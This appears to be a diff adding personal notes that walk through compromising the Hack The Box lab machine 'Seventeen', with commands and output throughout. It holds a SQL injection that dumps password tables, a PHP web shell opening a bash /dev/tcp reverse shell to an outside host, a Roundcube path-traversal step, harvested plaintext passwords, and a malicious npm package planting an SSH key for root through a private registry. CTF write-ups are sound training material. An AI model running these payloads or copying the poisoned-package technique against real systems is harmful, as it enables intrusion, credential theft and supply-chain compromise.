@@ -1,0 +1,588 @@
+let's enumerate first
+command: sudo rustscan -a 10.10.11.165
+result:
+PORT     STATE SERVICE  REASON
+22/tcp   open  ssh      syn-ack ttl 63
+80/tcp   open  http     syn-ack ttl 63
+8000/tcp open  http-alt syn-ack ttl 62
+
+command: sudo nmap -sSVC -A -p 22,80,8000 10.10.11.165
+result:
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 2eb26ebb927d5e6b3693171a8209e464 (RSA)
+|   256 1f57c653fc2d8b517d304202a4d65f44 (ECDSA)
+|_  256 d5a5363819fe0d677916e6da1791ebad (ED25519)
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Let's begin your education with us! 
+8000/tcp open  http    Apache httpd 2.4.38
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: 403 Forbidden
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: 172.17.0.4; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+register 10.10.11.165 seventeen.htb to /etc/hosts
+
+access: http://seventeen.htb/
+technology:
+HTTP/1.1 200 OK
+Date: Tue, 04 Jul 2023 17:48:31 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Last-Modified: Sun, 10 Apr 2022 05:31:57 GMT
+ETag: "50d1-5dc46256b75a0-gzip"
+Accept-Ranges: bytes
+Vary: Accept-Encoding
+Content-Length: 20689
+Connection: close
+Content-Type: text/html
+
+command: ./feroxbuster -u http://seventeen.htb/ -w /snap/feroxbuster/common/wordlist/raft-medium-directories.txt
+result:
+403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+301      GET        9l       28w      311c http://seventeen.htb/js => http://seventeen.htb/js/
+301      GET        9l       28w      315c http://seventeen.htb/images => http://seventeen.htb/images/
+200      GET       48l      158w     1284c http://seventeen.htb/js/magnific-popup-options.js
+200      GET      205l     1368w     8111c http://seventeen.htb/js/jquery.easing.1.3.js
+200      GET        1l       82w     3630c http://seventeen.htb/css/owl.carousel.min.css
+200      GET        7l      152w     8835c http://seventeen.htb/js/jquery.waypoints.min.js
+200      GET      296l      525w     6286c http://seventeen.htb/js/main.js
+200      GET        1l       34w     1055c http://seventeen.htb/css/owl.theme.default.min.css
+...
+
+access: http://seventeen.htb:8000/
+result:
+Forbidden
+You don't have permission to access this resource.
+
+command: ./feroxbuster -u http://seventeen.htb:8000 -w /snap/feroxbuster/common/wordlist/raft-medium-directories.txt
+result:
+404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+[####################] - 17s    30000/30000   0s      found:0       errors:0      
+[####################] - 17s    30000/30000   1755/s  http://seventeen.htb:8000/ 
+
+command: wfuzz -u http://seventeen.htb -H "Host: FUZZ.seventeen.htb" -w /snap/seclists/34/Discovery/DNS/subdomains-top1million-5000.txt --hh 20689
+result:
+000000689:   400        10 L     35 W       301 Ch      "gc._msdcs"                                                                                
+000001013:   200        347 L    991 W      17375 Ch    "exam"    
+
+access: http://exam.seventeen.htb/
+
+access: http://exam.seventeen.htb/admin/login.php
+result:
+Admin login disabled!
+
+choose example
+access: http://exam.seventeen.htb/?p=exams
+access: http://exam.seventeen.htb/?p=about
+
+result:
+HTTP/1.1 200 OK
+Date: Tue, 04 Jul 2023 17:53:28 GMT
+Server: Apache/2.4.38 (Debian)
+X-Powered-By: PHP/7.2.34
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 17418
+Content-Type: text/html; charset=UTF-8
+Connection: close
+
+command: ./feroxbuster -u http://exam.seventeen.htb -w /snap/feroxbuster/common/wordlist/raft-medium-directories.txt
+result:
+...
+200      GET    10735l    19850w   213040c http://exam.seventeen.htb/assets/css/styles.css
+200      GET        3l     2138w   151398c http://exam.seventeen.htb/plugins/summernote/summernote-bs4.min.js
+200      GET      136l      299w     4893c http://exam.seventeen.htb/dist/js/script.js
+200      GET        5l       22w    12505c http://exam.seventeen.htb/plugins/icheck-bootstrap/icheck-bootstrap.min.css
+200      GET        1l        1w      613c http://exam.seventeen.htb/plugins/jqvmap/jqvmap.min.css
+200      GET        1l        3w       48c http://exam.seventeen.htb/admin/login.php
+200      GET        1l      116w     5232c http://exam.seventeen.htb/plugins/datatables-bs4/css/dataTables.bootstrap4.min.css
+301      GET        9l       28w      316c http://exam.seventeen.htb/database => http://exam.seventeen.htb/database/
+...
+
+command: searchsploit exam management system                                       
+-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                            |  Path
+-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Dell Kace 1000 Systems Management Appliance DS-2014-001 - Multiple SQL Injections                                         | php/webapps/39057.txt
+Exam Hall Management System 1.0 - Unrestricted File Upload (Unauthenticated)                                              | php/webapps/50103.php
+Exam Hall Management System 1.0 - Unrestricted File Upload + RCE (Unauthenticated)                                        | php/webapps/50111.py
+Exam Reviewer Management System 1.0 - Remote Code Execution (RCE) (Authenticated)                                         | php/webapps/50726.txt
+Exam Reviewer Management System 1.0 - ‘id’ SQL Injection                                                              | php/webapps/50725.txt
+-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+sql injection: php/webapps/50725.txt
+Payload: p=take_exam&id=1' AND 4755=4755 AND 'VHNu'='VHNu
+
+access: http://exam.seventeen.htb/?p=take_exam&id=1%27%20AND%204755=4755%20AND%20%27VHNu%27=%27VHNu
+change 4755=4755 to 4755=4766
+access: http://exam.seventeen.htb/?p=take_exam&id=1%27%20AND%204755=4766%20AND%20%27VHNu%27=%27VHNu
+result:
+Unkown Exam ID
+command: sqlmap -u 'http://exam.seventeen.htb/?p=take_exam&id=1' -p id --technique B --batch
+result:
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: p=take_exam&id=1' AND 8722=8722 AND 'zFBk'='zFBk
+
+command: sqlmap --dbs -u 'http://exam.seventeen.htb/?p=take_exam&id=1' -p id --technique B --batch
+result:
+[*] db_sfms
+[*] erms_db
+[*] information_schema
+[*] roundcubedb
+
+command: sqlmap -D erms_db --tables -u 'http://exam.seventeen.htb/?p=take_exam&id=1' -p id --technique B --batch
+result:
++---------------+
+| category_list |
+| exam_list     |
+| option_list   |
+| question_list |
+| system_info   |
+| users         |
++---------------+
+
+command: sqlmap -D erms_db -T users --dump -u 'http://exam.seventeen.htb/?p=take_exam&id=1' -p id --technique B --batch 
+result:
++----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+
+| id | type | avatar                            | lastname | password                         | username         | firstname    | date_added          | last_login | date_updated        |
++----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+
+| 1  | 1    | ../oldmanagement/files/avatar.png | Admin    | fc8ec7b43523e186a27f46957818391c | admin            | Adminstrator | 2021-01-20 14:02:37 | NULL       | 2022-02-24 22:00:15 |
+| 6  | 2    | ../oldmanagement/files/avatar.png | Anthony  | 48bb86d036bb993dfdcf7fefdc60cc06 | UndetectableMark | Mark         | 2021-09-30 16:34:02 | NULL       | 2022-05-10 08:21:39 |
+| 7  | 2    | ../oldmanagement/files/avatar.png | Smith    | 184fe92824bea12486ae9a56050228ee | Stev1992         | Steven       | 2022-02-22 21:05:07 | NULL       | 2022-02-24 22:00:24 |
++----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+
+
+add oldmanagement.seventeen.htb to /etc/hosts
+command: sqlmap -D db_sfms --tables -u 'http://exam.seventeen.htb/?p=take_exam&id=1' -p id --technique B --batch
+result:
++---------+
+| user    |
+| storage |
+| student |
++---------+
+
+command: sqlmap -D db_sfms -T user --dump -u 'http://exam.seventeen.htb/?p=take_exam&id=1' -p id --technique B --batch             
+result:
++---------+---------------+---------------+----------------------------------+------------------+---------------+
+| user_id | status        | lastname      | password                         | username         | firstname     |
++---------+---------------+---------------+----------------------------------+------------------+---------------+
+| 1       | administrator | Administrator | fc8ec7b43523e186a27f46957818391c | admin            | Administrator |
+| 2       | Regular       | Anthony       | b35e311c80075c4916935cbbbd770cef | UndetectableMark | Mark          |
+| 4       | Regular       | Smith         | 112dd9d08abf9dcceec8bc6d3e26b138 | Stev1992         | Steven        |
++---------+---------------+---------------+----------------------------------+------------------+---------------+
+
+command: sqlmap -D db_sfms -T student --dump -u 'http://exam.seventeen.htb/?p=take_exam&id=1' -p id --technique B --batch
+result:
++---------+----+--------+---------+----------+----------------------------------------------------+-----------+
+| stud_id | yr | gender | stud_no | lastname | password                                           | firstname |
++---------+----+--------+---------+----------+----------------------------------------------------+-----------+
+| 1       | 1A | Male   | 12345   | Smith    | 1a40620f9a4ed6cb8d81a1d365559233                   | John      |
+| 2       | 2B | Male   | 23347   | Mille    | abb635c915b0cc296e071e8d76e9060c                   | James     |
+| 3       | 2C | Female | 31234   | Shane    | a2afa567b1efdb42d8966353337d9024 (autodestruction) | Kelly     |
+| 4       | 3C | Female | 43347   | Hales    | a1428092eb55781de5eb4fd5e2ceb835                   | Jamie     |
++---------+----+--------+---------+----------+----------------------------------------------------+-----------+
+
+access: http://oldmanagement.seventeen.htb:8000/oldmanagement/
+student no: 31234
+password: autodestruction
+
+download: http://oldmanagement.seventeen.htb:8000/oldmanagement/download.php?store_id=33
+result:
+Pleaselet Mr. Sam know the exact time when you can participate inthe sessions. And he wanted you to know that he won't be active
+thorough the socials these days.You can useour new webmail service instead. (https://mastermailer.seventeen.htb/)
+
+register mastermailer.seventeen to /etc/hosts
+access: http://mastermailer.seventeen.htb:8000/mastermailer/
+html:
+@licstart  The following is the entire license notice for the 
+        JavaScript code in this page.
+
+        Copyright (C) The Roundcube Dev Team
+
+access: http://mastermailer.seventeen.htb:8000/mastermailer/CHANGELOG
+result:
+CHANGELOG Roundcube Webmail
+===========================
+
+RELEASE 1.4.2
+CVE-2020-12641 access: https://github.com/DrunkenShells/Disclosures/tree/master/CVE-2020-12641-Command%20Injection-Roundcube
+
+access: http://mastermailer.seventeen.htb:8000/mastermailer/installer/?_step=1
+payload:
+_step=2&_product_name=Seventeen+Webmail&submit=UPDATE+CONFIG&_plugins_qwerty=[path here]
+
+Find upload path on oldmanagement.
+command: curl http://oldmanagement.seventeen.htb:8000/oldmanagement/files/31234/
+response:
+<h1>Forbidden</h1>                                                                                                                                                                                                                 
+
+command: curl http://oldmanagement.seventeen.htb:8000/oldmanagement/files/31235/
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.38 (Debian) Server at oldmanagement.seventeen.htb Port 8000</address>
+</body></html>
+
+feroxbuster files/31234
+
+command: ./feroxbuster -u http://oldmanagement.seventeen.htb:8000/oldmanagement/files/31234/ -w /snap/feroxbuster/common/wordlist/raft-medium-directories.txt 
+result:
+404      GET        9l       31w      291c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+403      GET        1l        1w       18c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+301      GET        9l       28w      376c http://oldmanagement.seventeen.htb:8000/oldmanagement/files/31234/papers => http://oldmanagement.seventeen.htb:8000/oldmanagement/files/31234/papers/
+[####################] - 33s    60008/60008   0s      found:1       errors:0      
+[####################] - 30s    30000/30000   986/s   http://oldmanagement.seventeen.htb:8000/oldmanagement/files/31234/ 
+[####################] - 27s    30000/30000   1104/s  http://oldmanagement.seventeen.htb:8000/oldmanagement/files/31234/papers/  
+
+create php shell name it papers.php upload to oldmanagement 
+code:
+<?php system("bash -c 'bash -i >& /dev/tcp/10.10.16.19/7979 0>&1'"); ?>
+
+access: http://mastermailer.seventeen.htb:8000/mastermailer/installer/index.php?_step=2
+click update config on below form intecep it change payload to this:
+_plugins_qwerty=../../../../../../../../../var/www/html/oldmanagement/files/31234/papers&_step=2&_product_name=Seventeen+Webmail&submit=UPDATE+CONFIG
+
+command: nc -lvnp 7979
+access: http://mastermailer.seventeen.htb:8000/mastermailer/
+access it until reverse shell connection success.
+
+command: cd /
+command: ls -al .dockerenv 
+-rwxr-xr-x 1 root root 0 Jul  4 12:48 .dockerenv
+
+command: cat /etc/passwd | grep -v -e nologin -e false
+root:x:0:0:root:/root:/bin/bash
+sync:x:4:65534:sync:/bin:/bin/sync
+mark:x:1000:1000:,,,:/var/www/html:/bin/bash
+
+command: cd /var/www/html
+command: ls -al
+result:
+drwxr-xr-x 1 www-data www-data 4096 May 31  2022 employeemanagementsystem
+drwxr-xr-x 1 www-data www-data 4096 May 31  2022 mastermailer
+drwxr-xr-x 1 www-data www-data 4096 Jul  4 18:10 oldmanagement
+
+command: cd /var/www/html/employeemanagementsystem
+command: cat edit.php
+result:
+<?php
+
+require_once ('process/dbh.php');
+$sql = "SELECT * FROM `employee` WHERE 1";
+
+//echo "$sql";
+$result = mysqli_query($conn, $sql);
+if(isset($_POST['update']))
+
+command: cat process/dbh.php
+result:
+$servername = "localhost";
+$dBUsername = "root";
+$dbPassword = "2020bestyearofmylife";
+$dBName = "ems";
+
+command: cd /var/www/html/oldmanagement/admin
+command: cat conn.php
+result:
+<?php
+	$conn = mysqli_connect("127.0.0.1", "mysqluser", "mysqlpassword", "db_sfms");
+	
+	if(!$conn){
+		die("Error: Failed to connect to database!");
+	}
+	
+	$default_query = mysqli_query($conn, "SELECT * FROM `user`") or die(mysqli_error());
+	$check_default = mysqli_num_rows($default_query);
+	
+	if($check_default === 0){
+		$enrypted_password = md5('admin');
+		mysqli_query($conn, "INSERT INTO `user` VALUES('', 'Administrator', '', 'admin', '$enrypted_password', 'administrator')") or die(mysqli_error());
+		return false;
+	}
+?>
+
+command: ssh mark@10.10.11.165
+password: 2020bestyearofmylife
+
+command: cd /var/mail
+command: cat kavi
+result:
+To: kavi@seventeen.htb
+From: admin@seventeen.htb
+Subject: New staff manager application
+
+Hello Kavishka,
+
+Sorry I couldn't reach you sooner. Good job with the design. I loved it. 
+
+I think Mr. Johnson already told you about our new staff management system. Since our old one had some problems, they are hoping maybe we could migrate to a more modern one. For the first phase, he asked us just a simple web UI to store the details of the staff members.
+
+I have already done some server-side for you. Even though, I did come across some problems with our private registry. However as we agreed, I removed our old logger and added loglevel instead. You just have to publish it to our registry and test it with the application. 
+
+Cheers,
+Mike
+
+command: netstat -tnlp
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:6004          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:6005          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:6006          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:6007          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:42519         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:6008          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:6009          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:993           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:995           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:4873          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 172.18.0.1:3306         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:110           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:143           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:6000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:6001          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8081          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:6002          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:6003          0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::8000                 :::*                    LISTEN      -     
+
+command: curl localhost:4873
+
+    <!DOCTYPE html>
+      <html lang="en-us"> 
+      <head>
+        <meta charset="utf-8">
+        <base href="http://localhost:4873/">
+        <title>Verdaccio</title>        
+        <link rel="icon" href="http://localhost:4873/-/static/favicon.ico"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1" /> 
+        <script>
+            window.__VERDACCIO_BASENAME_UI_OPTIONS={"darkMode":false,"basename":"/","base":"http://localhost:4873/","primaryColor":"#4b5e40","version":"5.6.0","pkgManagers":["yarn","pnpm","npm"],"login":true,"logo":"","title":"Verdaccio","scope":"","language":"es-US"}
+        </script>
+        
+      </head>    
+      <body class="body">
+      
+        <div id="root"></div>
+        <script defer="defer" src="http://localhost:4873/-/static/runtime.06493eae2f534100706f.js"></script><script defer="defer" src="http://localhost:4873/-/static/vendors.06493eae2f534100706f.js"></script><script defer="defer" src="http://localhost:4873/-/static/main.06493eae2f534100706f.js"></script>
+        
+      </body>
+    </html>
+
+command: npm search log --registry http://127.0.0.1:4873
+result:
+db-logger Log data to a database                                       =kavigihan 2022-03-15 1.0.1   log                       
+loglevel  Minimal lightweight logging for JavaScript, adding reliable… =pimterry  2022-05-11 1.8.0   log logger logging browser
+
+command: cd /dev/shm
+command: npm install db-logger --registry http://127.0.0.1:4873
+result:
+/var/mail
+└─┬ db-logger@1.0.1 
+  └─┬ mysql@2.18.1 
+    ├── bignumber.js@9.0.0 
+    ├─┬ readable-stream@2.3.7 
+    │ ├── core-util-is@1.0.3 
+    │ ├── inherits@2.0.4 
+    │ ├── isarray@1.0.0 
+    │ ├── process-nextick-args@2.0.1 
+    │ ├── string_decoder@1.1.1 
+    │ └── util-deprecate@1.0.2 
+    ├── safe-buffer@5.1.2 
+    └── sqlstring@2.3.1 
+
+command: ls -al node_modules/
+total 0
+drwxrwxr-x 14 mark mark 280 Jul  4 18:28 .
+drwxrwxrwt  3 root root  60 Jul  4 18:28 ..
+drwxrwxr-x  3 mark mark 240 Jul  4 18:28 bignumber.js
+drwxrwxr-x  3 mark mark 120 Jul  4 18:28 core-util-is
+drwxrwxr-x  2 mark mark  80 Jul  4 18:28 db-logger
+drwxrwxr-x  2 mark mark 140 Jul  4 18:28 inherits
+drwxrwxr-x  2 mark mark 200 Jul  4 18:28 isarray
+drwxrwxr-x  3 mark mark 160 Jul  4 18:28 mysql
+drwxrwxr-x  2 mark mark 120 Jul  4 18:28 process-nextick-args
+drwxrwxr-x  4 mark mark 360 Jul  4 18:28 readable-stream
+drwxrwxr-x  2 mark mark 140 Jul  4 18:28 safe-buffer
+drwxrwxr-x  3 mark mark 160 Jul  4 18:28 sqlstring
+drwxrwxr-x  3 mark mark 140 Jul  4 18:28 string_decoder
+drwxrwxr-x  2 mark mark 160 Jul  4 18:28 util-deprecate
+
+command: cd /dev/shm/node_modules/db-logger
+command: cat package.json
+command: cat logger.js 
+var mysql = require('mysql');
+
+var con = mysql.createConnection({
+  host: "localhost",
+  user: "root",
+  password: "IhateMathematics123#",
+  database: "logger"
+});
+
+function log(msg) {
+    con.connect(function(err) {
+        if (err) throw err;
+        var date = Date();
+        var sql = `INSERT INTO logs (time, msg) VALUES (${date}, ${msg});`;
+        con.query(sql, function (err, result) {
+        if (err) throw err;
+        console.log("[+] Logged");
+        });
+    });
+};
+
+module.exports.log = log
+
+command: su - kavi
+passowrd: IhateMathematics123#
+
+command: ls -al
+total 44
+drwxr-x--- 7 kavi kavi 4096 Jul  4 16:18 .
+drwxr-xr-x 4 root root 4096 Apr  8  2022 ..
+lrwxrwxrwx 1 kavi kavi    9 Apr 10  2022 .bash_history -> /dev/null
+-rw-r--r-- 1 kavi kavi  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 kavi kavi 3771 Apr  4  2018 .bashrc
+drwx------ 2 kavi kavi 4096 Feb 19  2022 .cache
+drwxrwxr-x 3 kavi kavi 4096 Feb 26  2022 .composer
+drwx------ 3 kavi kavi 4096 Feb 19  2022 .gnupg
+drwxrwxr-x 3 kavi kavi 4096 Feb 19  2022 .local
+drwxrwxr-x 2 kavi kavi 4096 Jul  4 16:34 .npm
+-rw------- 1 kavi kavi   32 Jul  4 18:30 .npmrc
+-rw-r--r-- 1 kavi kavi  807 Apr  4  2018 .profile
+
+command: cat .npmrc
+result:
+registry=http://127.0.0.1:4873/
+
+command: cd /opt/app
+command: cat index.js
+command: cat startup.sh 
+#!/bin/bash
+
+cd /opt/app
+
+deps=('db-logger' 'loglevel')
+
+for dep in ${deps[@]}; do
+    /bin/echo "[=] Checking for $dep"
+    o=$(/usr/bin/npm -l ls|/bin/grep $dep)
+
+    if [[ "$o" != *"$dep"* ]]; then
+        /bin/echo "[+] Installing $dep"
+        /usr/bin/npm install $dep --silent
+        /bin/chown root:root node_modules -R
+    else
+        /bin/echo "[+] $dep already installed"
+
+    fi
+done
+
+/bin/echo "[+] Starting the app"
+
+/usr/bin/node /opt/app/index.js
+
+command: sudo -l
+[sudo] password for kavi: 
+Matching Defaults entries for kavi on seventeen:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User kavi may run the following commands on seventeen:
+    (ALL) /opt/app/startup.sh
+
+command: npm login
+result: disabled
+
+host> sudo docker run -it --rm --name verdaccio -p 4873:4873 verdaccio/verdaccio
+host> npm init
+This utility will walk you through creating a package.json file.
+It only covers the most common items, and tries to guess sensible defaults.
+
+See `npm help init` for definitive documentation on these fields
+and exactly what they do.
+
+Use `npm install <pkg>` afterwards to install a package and
+save it as a dependency in the package.json file.
+
+Press ^C at any time to quit.
+package name: (hacky) loglevel
+version: (1.0.0) 2.0.0
+description: 
+entry point: (index.js) 
+test command: 
+git repository: 
+keywords: 
+author: 
+license: (ISC) 
+About to write to /home/donika-pentest/Documents/hacky/package.json:
+
+{
+  "name": "loglevel",
+  "version": "2.0.0",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "author": "",
+  "license": "ISC"
+}
+
+
+Is this OK? (yes) 
+
+command: cat index.js
+result:
+const cp = require("child_process")
+
+cp.exec("mkdir -p /root/.ssh; echo 'id_rsa' > /root/.ssh/authorized_keys");
+
+function log(msg) {
+    console.log(msg);
+}
+
+function debug(msg) {
+    console.log(msg);
+}
+
+function warn(msg) {
+    console.log(msg);
+}
+
+module.exports.log = log;     
+command: npm adduser --registry http://localhost:4873 --auth-type=legacy
+npm notice Log in on http://localhost:4873/
+Username: 0xdf
+Password: 
+Email: (this IS public) 0xdf@0xdf.com
+Logged in on http://localhost:4873/.
+
+command: npm publish --registry http://localhost:4873
+command: echo 'registry=http://10.10.16.19:4873' > .npmrc
+command: sudo /opt/app/startup.sh
+
+command: ssh -i id_rsa_new root@10.10.11.165
+command: cat /root/root.txt
+bc7dc33a0a4d4595f18cf7066286b85f
+
+resource:
+https://0xdf.gitlab.io/2022/09/24/htb-seventeen.html
